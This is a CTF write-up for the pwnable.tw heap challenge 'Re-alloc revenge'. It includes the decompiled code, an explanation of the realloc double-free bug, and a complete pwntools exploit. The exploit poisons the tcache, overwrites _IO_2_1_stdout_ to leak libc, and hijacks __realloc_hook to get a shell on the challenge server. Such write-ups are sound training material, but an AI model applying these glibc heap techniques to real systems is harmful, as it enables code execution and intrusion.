---
title: Re-alloc revenge (350 pts) - pwnable.tw
date: 2025-09-24 19:59:41
tags: ['pwnable.tw']
---

## 0x1. Initial Reconnaissance 

### file 
```
↪ file re-alloc_revenge
re-alloc_revenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a93ffa9d1472955c6ee86b3c19759e6295f65f70, for GNU/Linux 3.2.0, not stripped
```

### checksec
```
↪ checksec --file=re-alloc_revenge
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   86 Symbols	  Partial	1		2		re-alloc_revenge
```

### ./re-alloc_revenge
```
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 1
Index:0
Size:30
Data:ndd
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 2
Index:0
Size:50
Data:ndd123
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
🍊      RE Allocator      🍊
$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$   1. Alloc               $
$   2. Realloc             $
$   3. Free                $
$   4. Exit                $
$$$$$$$$$$$$$$$$$$$$$$$$$$$
Your choice: 3
Index:0
```

## 0x2. Reverse Engineering

### main
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  v3 = 0;
  init_proc(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 2 )
        break;
      reallocate();
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        rfree();
      }
      else
      {
        if ( v3 == 4 )
          _exit(0);
LABEL_13:
        puts("Invalid Choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_13;
      allocate();
    }
  }
}
```


### Allocate
```c
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v4; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )
    {
      v4 = malloc(size);
      if ( v4 )
      {
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], size));
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}
```

### reallocate
```c
int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc((void *)heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:");
  return read_input(heap[v1], size);
}
```

### rfree 
```c
int rfree()
{
  _QWORD *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc((void *)heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (int)v0;
}
```

## 0x3. Analysis

- In this challenge, you have 3 options:
    - Allocate a size <= 0x78, then they store it in a 2-elements array in bss.
    - Re-allocate a chunk, expand, shrink or even free it but still keep the address of the chunk.
    - Free a chunk and assign the element in the array to null.

Notice that when you use Alloc function to write to the chunk, they will add a null byte to the end of your input.

## 0x4. Exploit

Because this challenge has no print option, you can do as the same as heap_paradise challenge to get libc address. The most difficult in this challenge is how you build structure with just two elements to store chunk's address. 

### Step 1: build a fake chunk, and prepare tcache bins.

- First of all, I build 2 chunks, and these first 2 chunks will be placed at ```\x50``` and ```\x90``` offset. I choose to build the fake chunk of ```0x460``` bytes at ```\xb0``` offset. Use double-free bug to acquire this fake chunk and also free 2 chunks I create above. 
    - Create 2 chunks at ```\x50``` and ```\x90``` offset (these 2 chunks have the same size).
    - Free the first chunk to put it into tcache and also assign the first element to null.
    - Realloc the second chunk to 0 to free it without reset the element (now, fd pointer of the second chunk points to the address of the first chunk).
    - Realloc the second chunk to a bigger size to overwrite ```\xc0``` to the first byte.
    - Allocate a chunk of the same size as the second chunk to make our fake chunk become the head of the tcache entry.
    - Free the second chunk.
    - Realloc the second chunk to overwrite tcache key, and free it again.

After the process above, your setup will be like that: 

```
pwndbg> p &__bss_start 
$1 = (<data variable, no debug info> *) 0x5622310d0010

pwndbg> x/2gx 0x5622310d0010 + 0x40
0x5622310d0050 <heap>:	0x0000562233bd52c0	0x0000000000000000

pwndbg> x/4gx 0x0000562233bd52b0
0x5624d1dd72b0:	0x0000000000000000	0x0000000000000461
0x5624d1dd72c0:	0x0000000000000000	0x0000000000000000

pwndbg> bins
tcachebins
0x50 [  1]: 0x562233bd52a0 ◂— 0x562233bd52a0
0x60 [  2]: 0x562233bd52a0 ◂— 0x562233bd52a0
```

The reason behind the setup 2 tcache entries as above is for later clearance.

### Step 2: Setup the next chunk of our fake chunk.

- Our fake chunk is at ```0xb0``` and ```0x460``` bytes, so the next chunk will be at ```0xb0 + 0x460```, to reach these address you can create 8 chunks of 0x80 bytes. To do this, create a chunk of 0x70 bytes, expand it to 0x80 bytes then free it, thus avoid it placed into 0x70 entry. Repeat it 8 times.

After these step, free our fake chunk to put it into unsortedbin.

### Step 3: Overwrite __IO_2_1_stdout_.

- In my case I can do that:
    - Allocate a chunk of 0x50 bytes to get the second chunk, that I created at the beginning, from tcache.
    - Overwrite ```\xc0``` to the first byte, and also change its size to 0x40 (that helps you to free this chunk).
    - Allocate a chunk of 0x50 bytes again to make our fake chunk become the head of tcache entry.
    - Expand the chunk to 0x60 bytes and free it.
    - Realloc these chunk to 0x60 bytes again, overwrite tcache key and free it again.
- Now you have the fake chunk as the head of an tcache entry, whose next pointer points to an address in libc.
- Because we have to overwrite 2 first bytes of fd pointer to reach ```_IO_2_1_stdout_```, we have only a 1/16 chance of guessing the correct address.

After overwriting ```_IO_2_1_stdout_``` like we did in heap paradise challenge and get the address of libc, let's move to next step.

### Step 4: Overwrite __realloc_hooks and get shell.

- Because it costs you 1 element for overwriting ```_IO_2_1_stdout_```, you just have only 1 element to overwrite ```__realloc_hook``` and get the shell.

- You could:
    - Allocate a chunk of 0x70 bytes.
    - Reallocate this chunk to 0 to place it to 0x70 tcache entry.
    - Reallocate this chunk to 0x40 so the remaining 0x30 bytes go into the 0x30 tcache entry.
    - Free it.
    - Allocate a chunk of 0x70 bytes again and overwrite the chunk's fd pointer below with ```_realloc_hook``` addresss.
    - Free it again.
    - Allocate a chunk of 0x30 bytes, expand, free it then allocate a chunk of 0x30 bytes again and you succeed :D.


### Exploit
```py
from pwn import *

exe = ELF("./re-alloc_revenge_patched")
libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
ld = ELF("./ld-2.29.so")

context.binary = exe
context.log_level = "debug"
# context.aslr = False

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main")
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214")
    else:
        r = remote("chall.pwnable.tw", 10310)

    return r

def alloc (p, id, size, content):
    p.sendlineafter (b'Your choice: ', b'1')
    p.sendafter (b'Index:', id)
    p.sendafter (b'Size:', size)
    p.sendafter (b'Data:', content)

def realloc (p, id, size, content):
    p.sendlineafter (b'Your choice: ', b'2')
    p.sendafter (b'Index:', id)
    p.sendafter (b'Size:', size)
    if size != b'0':
        p.sendafter (b'Data:', content)

def free (p, id):
    p.sendlineafter (b'Your choice: ', b'3')
    p.sendafter (b'Index:', id)


def main():
    p = conn()

    # Setup tcache
    alloc (p, b'0', b'50', b'ndd1')
    alloc (p, b'1', b'50', p64 (0) * 3 + p64 (0x461))
    free (p, b'0')
    realloc (p, b'1', b'0', b'')
    realloc (p, b'1', b'50', b'\xc0')

    # Free chunk 1
    alloc (p, b'0', b'50', b'1111')
    realloc (p, b'1', b'60', b'ndd123')
    free (p, b'1')  
    

    realloc (p, b'0', b'80', b'\x00' * 16)
    realloc (p, b'0', b'0', b'')
    realloc (p, b'0', b'80', b'\x00' * 16)
    free (p, b'0')

    alloc (p, b'0', b'50', b'2222')

    # Setup next chunk and so on
    print ("Setup next chunk -----------------------------------------------------------------------")
    alloc (p, b'1', b'104', p64 (0) * 3 + p64 (0x21))
    realloc (p, b'1', b'120', b'\x00')
    free (p, b'1')

    for i in range (7):
        alloc (p, b'1', b'104', b'dd')
        realloc (p, b'1', b'120', b'dd')
        free (p, b'1')

    # next chunk
    print ("Next chunk -------------------------------------------------------------------------")
    alloc (p, b'1', b'104', b'dd')
    realloc (p, b'1', b'104', p64 (0) * 3 + p64(0x21) + p64 (0) * 3 + p64 (0x21))
    free (p, b'1')

    free (p, b'0')

    ### set up tcache entry
    print ("Setup tcache entry ---------------------------------------------------------------------")
    alloc (p, b'0', b'60', b'\xc0')
    realloc (p, b'0', b'0', b'')
    realloc (p, b'0', b'60', b'\xc0')
    alloc (p, b'1', b'60', p64 (0) * 3)
    realloc (p, b'1', b'80', p64 (0) * 3 + p64 (0x41) + b'\x60\x27') # 1/16 
    free (p, b'1')
    realloc (p, b'0', b'80', p64 (0) * 2)
    free (p, b'0')

    ### Overwrite _IO_2_1_stdout_
    print ("Overwrite _IO_2_1_stdout_ -----------------------------------------------------------------")
    alloc (p, b'0', b'60', b'dd')
    _IO_MAGIC = 0xfbad0000
    _IO_IS_APPENDING = 0x1000
    _IO_CURRENTLY_PUTTING = 0x800
    p.sendlineafter (b'Your choice: ', b'1')
    p.sendafter (b'Index:', b'1')
    p.sendafter (b'Size:', b'60')

    p.sendafter (b'Data:', p64 (_IO_MAGIC | _IO_IS_APPENDING | _IO_CURRENTLY_PUTTING) + p64 (0) * 3)
    
    p.recv (8)
    
    libc.address = u64 (p.recv (6) + b'\x00' * 2) - libc.symbols['_IO_stdfile_2_lock']
    print ("The address of libc is: ", hex (libc.address))

    free (p, b'0')

    ### get shell
    print ("Get shell -----------------------------------------------------------------------------------")

    alloc (p, b'0', b'104', b'dd')
    realloc (p, b'0', b'0', b'')
    realloc (p, b'0', b'50', b'dd')
    free (p, b'0')

    alloc (p, b'0', b'104', p64 (0) * 7 + p64 (0x31) + p64 (libc.symbols['__realloc_hook']))
    free (p, b'0')
    alloc (p, b'0', b'30', b'22')
    realloc (p, b'0', b'50', b'33')
    free (p, b'0')

    alloc (p, b'0', b'30', p64 (libc.address + 0x106ef8))
    realloc (p, b'0', b'0', b'')


    p.interactive()


# if __name__ == "__main__":
while True:
    try:  
        main()
    except:
        continue 
```